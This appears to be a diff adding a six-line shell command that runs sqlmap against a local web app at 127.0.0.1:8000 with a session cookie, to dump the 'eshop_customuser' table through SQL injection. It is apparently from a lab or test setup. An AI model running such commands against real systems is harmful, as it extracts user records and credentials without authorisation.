@@ -1,0 +1,6 @@
+sqlmap -u "http://127.0.0.1:8000/?q=test" \
+       --cookie="sessionid=6oj2r541khqshy6mg4o1oxkddjm4fbbj" \
+       --batch \
+       --threads 8 \
+       -T eshop_customuser \
+       --dump
